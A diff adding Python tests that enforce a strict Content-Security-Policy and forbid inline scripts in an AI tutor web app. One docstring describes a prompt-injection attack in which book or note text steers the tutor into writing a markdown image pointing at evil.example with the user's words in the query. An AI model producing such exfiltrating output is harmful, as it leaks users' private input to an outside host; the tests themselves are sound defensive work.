@@ -191,6 +191,53 @@ def test_cross_origin_changes_are_rejected(client):
     assert same.status_code == 400  # passes the check; then: a subject needs a name
 
 
+def csp(response) -> dict[str, list[str]]:
+    policy = response.headers["content-security-policy"]
+    return {
+        name: values
+        for name, *values in (d.split() for d in policy.split(";") if d.strip())
+    }
+
+
+def test_a_content_security_policy_keeps_the_page_to_itself(client):
+    """Security review M2 (2026-11-12): text from a book or note can steer the tutor
+    (prompt injection) into writing ![](https://evil.example/?q=<what you said>); the
+    browser must not fetch it, nor run or load anything from elsewhere."""
+    for path in ("/", "/static/app.js", "/api/subjects", "/nope"):
+        policy = csp(client.get(path))
+        assert policy["default-src"] == ["'self'"]
+        assert policy["script-src"] == ["'self'"]  # no inline scripts, no eval
+        assert policy["img-src"] == ["'self'", "data:", "blob:"]
+        assert policy["connect-src"] == ["'self'"]
+        assert policy["object-src"] == ["'none'"]
+        assert policy["base-uri"] == ["'none'"]
+        assert policy["frame-ancestors"] == ["'none'"]
+        assert not any("http" in v or v == "*" for vs in policy.values() for v in vs)
+    page = client.get("/")
+    assert page.headers["x-content-type-options"] == "nosniff"
+    assert page.headers["referrer-policy"] == "no-referrer"
+
+
+def test_the_setup_screen_has_the_same_policy(monkeypatch):
+    from velocity.web import serve_app
+
+    with TestClient(serve_app(None), base_url="http://127.0.0.1:8765") as setup:
+        assert csp(setup.get("/"))["img-src"] == ["'self'", "data:", "blob:"]
+
+
+def test_the_page_has_no_inline_scripts_or_handlers():
+    """What the policy would block: keep the page free of it."""
+    html = (STATIC / "index.html").read_text(encoding="utf-8")
+    assert not re.search(r"<script(?![^>]*\bsrc=)[^>]*>", html)
+    for name in PAGE_FILES:
+        text = (STATIC / name).read_text(encoding="utf-8")
+        assert not re.search(r"""\son[a-z]+\s*=\s*["']""", text), name
+        assert not re.search(r"\beval\(|new Function\(|javascript:", text), name
+    assert "isEvalSupported: false" in (STATIC / "reader.js").read_text(
+        encoding="utf-8"
+    )
+
+
 def test_cli_web_starts_uvicorn_on_localhost(config, monkeypatch, capsys):
     from velocity import cli
 
